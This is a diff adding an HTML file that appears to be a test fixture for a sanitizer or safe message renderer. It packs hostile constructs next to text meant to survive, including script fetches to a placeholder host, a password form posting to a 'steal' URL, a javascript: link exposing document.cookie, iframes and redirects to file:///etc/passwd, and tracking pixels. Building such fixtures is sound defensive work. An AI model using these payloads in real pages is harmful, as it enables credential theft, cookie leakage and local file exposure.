@@ -1,0 +1,29 @@
+<!doctype html>
+<html>
+<head>
+  <base href="file:///home/user/">
+  <meta http-equiv="refresh" content="0;url=https://example.invalid/escape">
+  <style>
+    @import url(https://example.invalid/import.css);
+    body { background-image: url(http://127.0.0.1:8080/track); }
+  </style>
+  <script>
+    fetch('https://example.invalid/script-ran');
+    document.title = 'SCRIPT EXECUTED';
+  </script>
+</head>
+<body onload="location='file:///etc/passwd'">
+  <h1>Hostile message remains readable</h1>
+  <p onclick="fetch('https://example.invalid/click')">Safe text survives.</p>
+  <img src="http://127.0.0.1:8080/pixel.gif" width="1" height="1" onerror="alert(1)" alt="tracking pixel">
+  <form action="https://example.invalid/steal"><input name="password"><button>Submit</button></form>
+  <iframe src="file:///etc/passwd"></iframe>
+  <object data="https://example.invalid/object"></object>
+  <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+  <a href="javascript:alert(document.cookie)">unsafe link</a>
+  <a href="https://example.com/safe">safe external link</a>
+  <table><tr><td>Malformed table<tr><td>still bounded</table>
+  <!-- deliberately unclosed nesting -->
+  <blockquote><div><p>Quoted content
+</body>
+</html>
